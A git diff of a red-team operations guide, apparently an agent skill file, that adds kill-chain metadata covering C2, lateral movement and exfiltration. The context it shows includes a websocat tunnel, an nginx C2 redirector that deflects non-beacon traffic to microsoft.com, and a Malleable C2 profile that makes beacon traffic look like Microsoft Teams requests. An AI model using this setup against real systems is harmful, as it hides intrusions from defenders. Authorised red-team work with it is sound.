@@ -4,6 +4,14 @@ description: Advanced red team operations — OPSEC discipline, C2 infrastructur
 metadata:
   type: offensive
   phase: operations
+kill_chain:
+  phase: [c2, actions]
+  step: [6, 7]
+  attck_tactics: [TA0011, TA0008, TA0010]
+depends_on: [edr-evasion, exploit-development, red-team-ops]
+feeds_into: [threat-hunting]
+inputs: [c2_framework, redirector_config]
+outputs: [c2_infrastructure, opsec_report, exfil_channel]
   ---
 
 # Advanced Red Team Operations
@@ -52,27 +60,27 @@ websocat -E -b tcp-l:127.0.0.1:2222 ws://mytunnel.domain.com/<uuid> &
 server {
     listen 443 ssl;
     server_name legit-looking.com;
-    
+
     ssl_certificate /path/to/cert.pem;
     ssl_certificate_key /path/to/key.pem;
-    
+
     # Only forward traffic matching Malleable C2 profile
     location /api/v2/session {
         # Check custom header (beacon identifier)
         if ($http_x_session_id != "valid-beacon-id") {
             return 301 https://microsoft.com$request_uri;
         }
-        
+
         # Check User-Agent matches profile
         if ($http_user_agent !~* "Mozilla/5.0.*Teams") {
             return 301 https://microsoft.com$request_uri;
         }
-        
+
         # Forward to team server
         proxy_pass https://127.0.0.1:8443;
         proxy_ssl_verify off;
     }
-    
+
     # Deflect all other traffic to legitimate site
     location / {
         return 301 https://microsoft.com$request_uri;
@@ -95,22 +103,22 @@ set obfuscate "true";    # Avoid generic memory signatures
 # Mimic legitimate traffic (Microsoft Teams example)
 http-get {
     set uri "/api/v2/users/presence";
-    
+
     client {
         header "User-Agent" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) Teams/1.5.00.32283";
         header "Accept" "application/json";
-        
+
         metadata {
             base64url;
             prepend "session_id=";
             header "Cookie";
         }
     }
-    
+
     server {
         header "Content-Type" "application/json";
         header "Server" "Microsoft-IIS/10.0";
-        
+
         output {
             base64url;
             prepend "{\"status\":\"available\",\"data\":\"";
